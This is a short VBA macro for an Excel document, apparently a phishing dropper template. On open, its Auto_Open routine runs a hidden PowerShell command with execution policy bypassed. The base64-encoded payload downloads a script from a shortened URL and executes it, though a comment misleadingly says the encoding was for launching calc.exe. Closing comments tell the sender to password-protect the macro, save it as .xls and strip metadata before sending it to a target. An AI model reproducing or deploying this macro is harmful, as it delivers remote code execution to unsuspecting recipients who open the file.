Sub Auto_Open()
'Change to "visible" property on the left to "hidden" before running macro
Sheets("Sheet1").Visible = True
Sheets("Sheet1").Select
Dim strCommand As String
'Run the following in PowerShell to get encoded command: (cmd /c echo {IEX calc.exe}).split(' ')[1]
strCommand = "PowerShell.exe -Exec Bypass -NoL -Win Hidden -Enc aQBlAHgAIAAoACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwBiAGkAdAAuAGwAeQAvAGUAMABNAHcAOQB3ACcAKQApAA=="
Shell strCommand, 0
'Don't forget to password protect the macro, save as an xls and remove metadata before sending
End Sub
